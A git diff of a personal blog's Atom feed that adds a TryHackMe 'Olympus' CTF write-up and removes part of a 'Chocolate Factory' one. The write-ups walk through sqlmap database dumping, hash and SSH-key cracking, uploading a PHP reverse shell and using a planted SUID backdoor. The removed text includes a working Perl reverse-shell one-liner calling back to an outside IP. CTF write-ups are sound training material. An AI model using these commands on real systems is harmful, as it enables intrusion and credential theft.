@@ -1,4 +1,235 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-06T19:08:25+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - SQHell</title><link href="http://localhost:4000/tryhackme-sqhell/" rel="alternate" type="text/html" title="TryHackMe - SQHell" /><published>2023-07-06T00:00:00+03:00</published><updated>2023-07-06T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-sqhell</id><content type="html" xml:base="http://localhost:4000/tryhackme-sqhell/"><![CDATA[<p>Try and find all the flags in the SQL Injections.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-08T18:18:47+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - Olympus</title><link href="http://localhost:4000/tryhackme-olympus/" rel="alternate" type="text/html" title="TryHackMe - Olympus" /><published>2023-07-08T00:00:00+03:00</published><updated>2023-07-08T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-olympus</id><content type="html" xml:base="http://localhost:4000/tryhackme-olympus/"><![CDATA[<p>Hey!</p>
+
+<p>Start the VM here and start enumerating! The machine can take some time to start. Please allow up to 5 minutes (Sorry for the inconvenience). Bruteforcing against any login page is out of scope and should not be used.</p>
+
+<p>If you get stuck, you can find hints that will guide you on my <a href="https://github.com/PetitPrinc3/TryHackMe-rooms/blob/main/Olympus/Hints.md">GitHub repository</a>.</p>
+
+<p>Well… Happy hacking ^^</p>
+
+<p>Petit Prince</p>
+
+<p>Created by <a href="https://tryhackme.com/p/PetitPrinc3">PetitPrinc3</a></p>
+
+<p><br /></p>
+
+<h3 id="what-is-flag-1">What is Flag 1?</h3>
+
+<p>Let’s do a <code class="language-plaintext highlighter-rouge">Nmap</code> scan to gather information about the target.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.35.164
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/olympus/nmap.png" alt="nmap" /></p>
+
+<p>As you can see <code class="language-plaintext highlighter-rouge">22/tcp and 80/tcp</code> ports are open.</p>
+
+<p>Let’s explore the website but we need to add <code class="language-plaintext highlighter-rouge">"olympus.thm"</code> to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/etc.png" alt="etc" /></p>
+
+<p>Here is a homepage. It seems <code class="language-plaintext highlighter-rouge">nothing</code> in there.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/home.png" alt="home" /></p>
+
+<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://olympus.thm/  -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/olympus/gobuster.png" alt="gobuster" /></p>
+
+<p>Now, let’s navigate to the <code class="language-plaintext highlighter-rouge">/~webmaster</code> page and explore its contents.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/webmaster.png" alt="webmaster" /></p>
+
+<p>On this page, we can see <code class="language-plaintext highlighter-rouge">posts shared by Root</code>, a <code class="language-plaintext highlighter-rouge">search</code> bar, a <code class="language-plaintext highlighter-rouge">login</code> bar, and several <code class="language-plaintext highlighter-rouge">categories</code>. There are several potential points on the page where <code class="language-plaintext highlighter-rouge">SQLi</code> can be attempted.</p>
+
+<p>First, we’ll capture the a categories page request and save it using <code class="language-plaintext highlighter-rouge">BurpSuite</code> <code class="language-plaintext highlighter-rouge">(Right Click &gt; Save Item)</code>.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/request.png" alt="request" /></p>
+
+<p>Then we’ll do a <code class="language-plaintext highlighter-rouge">sqlmap scan</code> on the captured request.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r ol.req --dbs
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/olympus/dbs.png" alt="dbs" /></p>
+
+<p>We found the <code class="language-plaintext highlighter-rouge">olympus database</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r ol.req -D olympus --tables
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/olympus/tables.png" alt="tables" /></p>
+
+<p>Let’s get the flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r ol.req -D olympus -T flag --dump
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/olympus/flag.png" alt="flag" /></p>
+
+<p>Well done! We find the <code class="language-plaintext highlighter-rouge">first flag</code>.</p>
+
+<p><br /></p>
+
+<h3 id="what-is-flag-2">What is Flag 2?</h3>
+
+<p>Now, let’s examine the <code class="language-plaintext highlighter-rouge">"users"</code> table.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r ol.req -D olympus -T users --dump
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/olympus/users.png" alt="users" /></p>
+
+<p>We find <code class="language-plaintext highlighter-rouge">three users</code> and their corresponding <code class="language-plaintext highlighter-rouge">hashes</code>. Additionally, there is a <code class="language-plaintext highlighter-rouge">subdomain</code> mentioned: <code class="language-plaintext highlighter-rouge">chat.olympus.thm</code></p>
+
+<p>First, let’s <code class="language-plaintext highlighter-rouge">crack these hashes</code>.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/crack.png" alt="crack" /></p>
+
+<p>After cracking the hashes, we found <code class="language-plaintext highlighter-rouge">only Prometheus' password</code>.</p>
+
+<p>Now, let’s return to the website and log in as Prometheus.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/admin.png" alt="admin" /></p>
+
+<p>An <code class="language-plaintext highlighter-rouge">admin page</code> appears.  I tried uploading a <code class="language-plaintext highlighter-rouge">reverse shell</code>, but it didn’t work. The admin page does not seem to provide any useful information.</p>
+
+<p>Let’s go to the <code class="language-plaintext highlighter-rouge">chat.olympus.thm</code> we found earlier.</p>
+
+<p>To access it, we need to <code class="language-plaintext highlighter-rouge">add the subdomain</code> to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/etc-2.png" alt="etc-2" /></p>
+
+<p>We are presented with a <code class="language-plaintext highlighter-rouge">login page</code>.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/login.png" alt="login" /></p>
+
+<p>Let’s <code class="language-plaintext highlighter-rouge">login as Prometheus</code>.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/chat.png" alt="chat" /></p>
+
+<p>An interesting chat application awaits us.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Zeus says</code> an interesting thing here. If we upload a file, the file name gets changed to a <code class="language-plaintext highlighter-rouge">random string</code>. However, let’s upload a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">reverse shell</a>.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/shell.png" alt="shell" /></p>
+
+<p>Now, let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://chat.olympus.thm/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/olympus/gobuster-2.png" alt="gobuster-2" /></p>
+
+<p>We navigate to the <code class="language-plaintext highlighter-rouge">"uploads"</code> directory, hoping to find the <code class="language-plaintext highlighter-rouge">shell.php</code> file we uploaded earlier.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/white.png" alt="white" /></p>
+
+<p>Unfortunately, <code class="language-plaintext highlighter-rouge">there is nothing</code> of interest here.</p>
+
+<p>Let’s go back to the Olympus database.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/tables-2.png" alt="tables-2" /></p>
+
+<p>Let’s <code class="language-plaintext highlighter-rouge">dump the chats</code> table.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/chats.png" alt="chats" /></p>
+
+<p>We found the <code class="language-plaintext highlighter-rouge">shell.php</code> file and the file name is changed. However, we need to set up a <code class="language-plaintext highlighter-rouge">netcat listener</code>. Then we can go <code class="language-plaintext highlighter-rouge">/uploads/filename</code>.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/url.png" alt="url" /></p>
+
+<p>And we are in!</p>
+
+<p><img src="/assets/img/tryhackme/olympus/in.png" alt="in" /></p>
+
+<p>Let’s get the <code class="language-plaintext highlighter-rouge">flag 2</code>.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/flag-2.png" alt="flag-2" /></p>
+
+<p><br /></p>
+
+<h3 id="what-is-flag-3">What is Flag 3?</h3>
+
+<p>Now, let’s examine the <code class="language-plaintext highlighter-rouge">zeus.txt</code> file.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/txt.png" alt="txt" /></p>
+
+<p>It appears that Prometheus may have placed a <code class="language-plaintext highlighter-rouge">backdoor in Olympus</code>. And according to what he said, <code class="language-plaintext highlighter-rouge">he got root privileges</code> this way. We need to find this file but first, let’s explore the server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -perm -04000 -ls 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/olympus/find.png" alt="find" /></p>
+
+<p>We found interesting things here. Unlike others, <code class="language-plaintext highlighter-rouge">Cputils</code> can be run with Zeus privileges.</p>
+
+<p>Let’s run.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/cputils.png" alt="cputils" /></p>
+
+<p>Let’s copy the <code class="language-plaintext highlighter-rouge">id_rsa</code> to our own machine.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/copy.png" alt="copy" /></p>
+
+<p>Then, we use <code class="language-plaintext highlighter-rouge">ssh2john</code> to <code class="language-plaintext highlighter-rouge">crack the RSA key</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh2john zeus.rsa &gt; zeus.hash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt zeus.hash
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/olympus/ssh2.png" alt="ssh2" /></p>
+
+<p>Now, we can access <code class="language-plaintext highlighter-rouge">Zeus with ssh</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod 600 zeus.rsa
+$ ssh -i zeus.rsa zeus@10.10.35.164
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/olympus/ssh-zeus.png" alt="ssh-zeus" /></p>
+
+<p>Now that we know Prometheus uploaded a backdoor. So I searched a lot and I found the file.  It is an <code class="language-plaintext highlighter-rouge">interesting file</code> located in the <code class="language-plaintext highlighter-rouge">/var/www/html/</code> directory.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/var.png" alt="var" /></p>
+
+<p>Let’s look at the <code class="language-plaintext highlighter-rouge">VIGQFQFMYOST.php</code> file and what’s in it.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/phfile.png" alt="phfile" /></p>
+
+<p>There is <code class="language-plaintext highlighter-rouge">password information</code>. More importantly, we can have root privileges with this file, so I think <code class="language-plaintext highlighter-rouge">suid_bd</code> is more interesting. Let’s try.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ uname -a; w; /lib/defended/libc.so.99
+</code></pre></div></div>
+<p><img src="/assets/img/tryhackme/olympus/root.png" alt="root" /></p>
+
+<p>Success! We now have <code class="language-plaintext highlighter-rouge">root access</code>.</p>
+
+<p>Let’s get the <code class="language-plaintext highlighter-rouge">root flag</code> from the <code class="language-plaintext highlighter-rouge">root directory</code>.</p>
+
+<p><img src="/assets/img/tryhackme/olympus/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="what-is-flag-4">What is Flag 4?</h3>
+
+<p><strong><code class="language-plaintext highlighter-rouge">The flag is located in /etc/</code></strong></p>
+
+<p>According to <code class="language-plaintext highlighter-rouge">hint</code>, the last flag is <code class="language-plaintext highlighter-rouge">located in /etc</code>. We can search for it using <code class="language-plaintext highlighter-rouge">grep</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ grep -r flag /etc
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/olympus/last-flag.png" alt="last-flag" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Success!</code> We found <code class="language-plaintext highlighter-rouge">bonus flag</code>.</p>
+
+<p><br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Congratulations!</code> We have successfully completed the steps to find all the flags. It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="vhost, upload, sqli, enumeration" /><summary type="html"><![CDATA[Hey!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/olympus.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/olympus.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - SQHell</title><link href="http://localhost:4000/tryhackme-sqhell/" rel="alternate" type="text/html" title="TryHackMe - SQHell" /><published>2023-07-06T00:00:00+03:00</published><updated>2023-07-06T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-sqhell</id><content type="html" xml:base="http://localhost:4000/tryhackme-sqhell/"><![CDATA[<p>Try and find all the flags in the SQL Injections.</p>
 
 <p>Give the machine a minute to boot and then connect to http://MACHINE_IP</p>
 
@@ -1234,8 +1465,8 @@ $ john --wordlist=usr/share/wordlists/rockyou.txt hash.hash
   <li><a href="https://tryhackme.com/room/marketplace">TryHackMe - The Marketplace</a> - <a href="https://mr0wido.github.io/tryhackme-the-marketplace/">My Writeup :punch:</a></li>
   <li><a href="https://tryhackme.com/room/wekorra">TryHackMe - Wekor</a></li>
   <li><a href="https://tryhackme.com/room/zeno">TryHackMe - Zeno</a></li>
-  <li><a href="https://tryhackme.com/room/sqhell">TryHackMe - SQHell</a></li>
-  <li><a href="https://tryhackme.com/room/olympusroom">TryHackMe - Olympus</a></li>
+  <li><a href="https://tryhackme.com/room/sqhell">TryHackMe - SQHell</a> - <a href="https://mr0wido.github.io/tryhackme-sqhell/">My Writeup :punch:</a></li>
+  <li><a href="https://tryhackme.com/room/olympusroom">TryHackMe - Olympus</a> - <a href="https://mr0wido.github.io/tryhackme-olympus/">My Writeup :punch:</a></li>
   <li><a href="https://tryhackme.com/room/revenge">TryHackMe - Revenge</a></li>
   <li><a href="https://tryhackme.com/room/metamorphosis">TryHackMe - Metamorphosis</a></li>
   <li><a href="https://tryhackme.com/room/wwbuddy">TryHackMe - WWBuddy</a></li>
@@ -1315,7 +1546,7 @@ $ john --wordlist=usr/share/wordlists/rockyou.txt hash.hash
 
 <p><br />
 <br />
-I hope you liked my article. See you in my other articles:hand:</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="sql injection, sqli guide" /><summary type="html"><![CDATA[In this article, I intended to explain SQL injection in the most basic and most easily understandable way. Because the resources, I tried to learn were often too detailed for the beginner level and not very clear for the beginner level. So, I preferred a shorter and clearer explanation. But it would not be right for me to give only the basic information in my article. I want you to understand the basics, and let the SQL injection fit your logic. So, there are many resources that I have shared in this article, check them out. There are many labs where you can practice your knowledge. I also shared a lot of cheat sheets as a helper. I hope the article is useful to you. It helps you to learn SQL injection :worried: Topics Basic First SQL Injection and Types SQL Injection Labs SQL Injection Sources SQL Injection Cheat Sheats Basic First What is a Database? A database is where all kinds of data and information are stored electronically. What is Database Management System (DBMS)? The database is usually controlled by a Database Management System (DBMS). Thanks to this system, data can be easily accessed, managed, changed, updated, and organized. Most databases today use SQL. What is SQL? SQL is a programming language used in databases to query, manipulate and define data, as well as to provide access control. SQL Injection and Types A web application sends SQL queries to use data found in the database. The attacker can inject their own queries into these SQL queries or manipulate the queries. In this case, it can access other information stored in the database. We call this situation the SQL Injection vulnerability. A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. In some cases, an attacker can obtain a persistent backdoor into an organization’s systems, leading to a long-term compromise that can go unnoticed for an extended period. Error-Based SQLi An error is received in response to submitted SQL queries. The attacker can also send new queries according to this error, or by manipulating the error, he can reach the information he wants to reach from within the output. Union-Based SQLi Multiple Select queries can be written using the Union operator. In this case, the attacker can write his own SELECT query with a union operator. But it should be noted that when the union expression is used, the number of columns must be equal to each other. Boolean-Based SQLi It does not return an error or requested information in response to submitted SQL queries. Instead, it gives a true or false answer. This makes the process very long. Time-Based SQLi It doesn’t return anything in response to submitted SQL queries. However, the attacker tries to see if the query works by adding functions such as sleep() to these SQL queries. Out-of-Ban SQLi None of the techniques described so far will work. The application’s response doesn’t depend on whether the query returns any data, on whether a database error occurs or on the time taken to execute the query. In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions with a system that you control. These can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself. Various network protocols can be used for this purpose, but typically the most effective is DNS. Warning Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you’re injecting into, it’s common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data. SQL Injection Labs Web Security Academy - All Labs TryHackMe - SQL Injection Lab TryHackMe - OWASP Juice Shop TryHackMe - SQL Injection TryHackMe - Sqlmap TryHackMe - Game Zone TryHackMe - Poster TryHackMe - Chill Hack - My Writeup :punch: TryHackMe - Gallery - My Writeup :punch: TryHackMe - Avengers Blog TryHackMe - The Marketplace - My Writeup :punch: TryHackMe - Wekor TryHackMe - Zeno TryHackMe - SQHell TryHackMe - Olympus TryHackMe - Revenge TryHackMe - Metamorphosis TryHackMe - WWBuddy TryHackMe - Unstable Twin TryHackMe - Daily Bugle - My Writeup :punch: TryHackMe - Year of the Dog TryHackMe - Year of the Pig TryHackMe - M4tr1x: Exit Denied PentesterLab - From SQL Injection to Shell PentesterLab - From SQL Injection to Shell: PostgreSQL Edition CTFLearn - Basic Injection CTFLearn - Inj3ction Time SQL Injection Sources Web Security Academy - SQL injection TryHackMe - SQL Injection HackerRank - SQL OWASP - SQL Injection Niveet Palan - Handbook for SQL Injection Graham Zemel - Step by Step Guide to SQL Injection Raj Chandel’s Blog - Manual SQL Injection Exploitation Step by Step Atmanand Nagpure - A technique that a lot of SQL injection beginners don’t know goswamiijaya - Identifying &amp; Exploiting SQL Injections: Manual &amp; Automated daffainfo - SQL Injection Security Lit Limited - Definitive Guide to SQL Injection goswamiijaya - Exploiting Error Based SQL Injections &amp; Bypassing Restrictions Lee Chun How - Out-of-Band (OOB) SQL Injection Mcry - First step to an SQL-Injection Secpy Community - SQL Injection: An Overview Frost - What is SQL Injection and How Does it Work Kontra Application Security - SQL Injection Start - SQL Injections CTFlearn - SQL Injection Imperva - What is SQL Injection Edward Low - Edward Low Sudarshan S - SQL INJECTION: IMPORTANT… Arth Detroja - SQL Injection A51F221B - Web penetration testing guide W3Schools - SQL Tutorial Codecademy - Learn SQL Programiz - Learn SQL: SQL Tutorial for Beginners TutorialsPoint - SQL Tutorial Cyber Security Roadmap SQL Injection Cheat Sheets Web Security Academy - SQL Injection Cheat Sheet Ismail Tasdelen - SQL Injection Payload List NetSPI SQL Injection Wiki Pentestmonkey - Oracle SQL Injection Cheat Sheet Pentestmonkey - MySQL SQL Injection Cheat Sheet Pentestmonkey - Postgres SQL Injection Cheat Sheet Pentestmonkey - Informix SQL Injection Cheat Sheet Pentestmonkey - MSSQL Injection Cheat Sheet Pentestmonkey - DB2 SQL Injection Cheat Sheet Pentestmonkey - Ingres SQL Injection Cheat Sheet Codecademy - Preventing SQL Injection Attacks Exploiting hard filtered SQL Injections MS Access SQL Injection Cheat Sheet Yazılım Kodlama - SQL Sorguları ve SQL Sorgu Örnekleri Cheatography - Injection SQL Cheat Sheet by Neolex Cheatography - SQL CheatSheet Cheat Sheet by nimakarimian INVICTI - SQL Injection Cheat Sheet Deadly Hacker - List of google dorks for sql injection Perspective Risk - MySQL SQL Injection Practical Cheat Sheet MySQL Injection Cheat Sheet I hope you liked my article. See you in my other articles:hand:]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/sqli.png" /><media:content medium="image" url="http://localhost:4000/assets/img/sqli.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Cyber Heroes</title><link href="http://localhost:4000/tryhackme-cyber-heroes/" rel="alternate" type="text/html" title="TryHackMe - Cyber Heroes" /><published>2023-03-30T00:00:00+03:00</published><updated>2023-03-30T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-cyber-heroes</id><content type="html" xml:base="http://localhost:4000/tryhackme-cyber-heroes/"><![CDATA[<p>Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!</p>
+I hope you liked my article. See you in my other articles:hand:</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="sql injection, sqli guide" /><summary type="html"><![CDATA[In this article, I intended to explain SQL injection in the most basic and most easily understandable way. Because the resources, I tried to learn were often too detailed for the beginner level and not very clear for the beginner level. So, I preferred a shorter and clearer explanation.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/sqli.png" /><media:content medium="image" url="http://localhost:4000/assets/img/sqli.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Cyber Heroes</title><link href="http://localhost:4000/tryhackme-cyber-heroes/" rel="alternate" type="text/html" title="TryHackMe - Cyber Heroes" /><published>2023-03-30T00:00:00+03:00</published><updated>2023-03-30T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-cyber-heroes</id><content type="html" xml:base="http://localhost:4000/tryhackme-cyber-heroes/"><![CDATA[<p>Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!</p>
 
 <p><br /></p>
 
@@ -1378,196 +1609,4 @@ I hope you liked my article. See you in my other articles:hand:</p>]]></content>
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, security, credential" /><summary type="html"><![CDATA[Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/cyber-heroes.png" /><media:content medium="image" url="http://localhost:4000/assets/img/cyber-heroes.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Chocolate Factory</title><link href="http://localhost:4000/tryhackme-chocolate-factory/" rel="alternate" type="text/html" title="TryHackMe Chocolate Factory" /><published>2023-03-29T00:00:00+03:00</published><updated>2023-03-29T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-chocolate-factory</id><content type="html" xml:base="http://localhost:4000/tryhackme-chocolate-factory/"><![CDATA[<p>A Charlie And The Chocolate Factory themed room, revisit Willy Wonka’s chocolate factory!</p>
-
-<p><br /></p>
-
-<h2 id="1-introduction">1. Introduction</h2>
-
-<p>Welcome to Willy Wonka’s Chocolate Factory!</p>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/golden-ticket.jpg" alt="golden-ticket" /></p>
-
-<p>This room was designed so that hackers can revisit the Willy Wonka’s Chocolate Factory and meet Oompa Loompa</p>
-
-<p>This is a beginner friendly room!</p>
-
-<p>If you have any issues / queries you can reach us through Discord or Twitter.</p>
-
-<p>( Created by AndyInfosec team for the community! )</p>
-
-<p><br /></p>
-
-<h2 id="2-challenges">2. Challenges</h2>
-
-<p><br /></p>
-
-<h3 id="21-enter-the-key-you-found">2.1 Enter the key you found!</h3>
-
-<p>Let’s do a nmap scan.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.153.7
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/nmap.png" alt="nmap" /></p>
-
-<p>A lot of ports are open.</p>
-
-<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/home.png" alt="home" /></p>
-
-<p>I see a login page. Let’s do a gobuster scan.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.153.7/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/gobuster.png" alt="gobuster" /></p>
-
-<p>We found a few php files. First, let’s look at <code class="language-plaintext highlighter-rouge">home.php</code>.</p>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/php.png" alt="php" /></p>
-
-<p>We can run commands on this page. Let’s connect with burp suite. Capture the page and send it to the repeater.</p>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/ls.png" alt="ls" /></p>
-
-<p>Let’s look at the files in the directory in order, of what we will find.</p>
-
-<ul>
-  <li>
-    <p><em><strong><code class="language-plaintext highlighter-rouge">index.php.bak</code></strong></em></p>
-
-    <p>I don’t see anything significant here.</p>
-
-    <p><img src="/assets/img/tryhackme/chocolate-factory/bak.png" alt="bak" /></p>
-  </li>
-  <li>
-    <p><em><strong><code class="language-plaintext highlighter-rouge">key_rev_key</code></strong></em></p>
-
-    <p>This file is probably a script because the cat command doesn’t work.</p>
-
-    <p><img src="/assets/img/tryhackme/chocolate-factory/key-rev-key.png" alt="key-rev-key" /></p>
-
-    <p>Let’s back to the website and download the key-rev-key file. <a href="http://10.10.153.7/key_rev_key">http://10.10.153.7/key_rev_key</a></p>
-
-    <p><img src="/assets/img/tryhackme/chocolate-factory/cat.png" alt="cat" /></p>
-
-    <p>Let’s try.</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ chmod +x key_rev_key
- $ ./key_rev_key 
-</code></pre></div>    </div>
-
-    <p><img src="/assets/img/tryhackme/chocolate-factory/try.png" alt="try" /></p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ strings key_rev_key
-</code></pre></div>    </div>
-
-    <p><img src="/assets/img/tryhackme/chocolate-factory/strings.png" alt="strings" /></p>
-
-    <p>Let’s try the name <code class="language-plaintext highlighter-rouge">laksdhfas</code>.</p>
-
-    <p><img src="/assets/img/tryhackme/chocolate-factory/key.png" alt="key" /></p>
-  </li>
-  <li>
-    <p><em><strong><code class="language-plaintext highlighter-rouge">validate.php</code></strong></em></p>
-
-    <p>We found the username and password for the website.</p>
-
-    <p><img src="/assets/img/tryhackme/chocolate-factory/validate.png" alt="validate" /></p>
-  </li>
-</ul>
-
-<p><br /></p>
-
-<h3 id="22-what-is-charlies-password">2.2 What is Charlie’s password?</h3>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: c*****</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="23-change-user-to-charlie">2.3 Change user to charlie</h3>
-
-<p>Now, we can execute a reverse-shell command on home.php. First, let’s go to the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey’s cheat sheet</a>. You can try all of them.</p>
-
-<p>Perl, python, and netcat are working.</p>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/shell.png" alt="shell" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.8.86.168";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
-</code></pre></div></div>
-
-<p>First, let’s setup a netcat listener.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
-</code></pre></div></div>
-
-<p>After copying and pasting.</p>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/reverse.png" alt="reverse" /></p>
-
-<p>We are inside.</p>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/inside-first.png" alt="inside-first" /></p>
-
-<p>Now, we can change the user to charlie.</p>
-
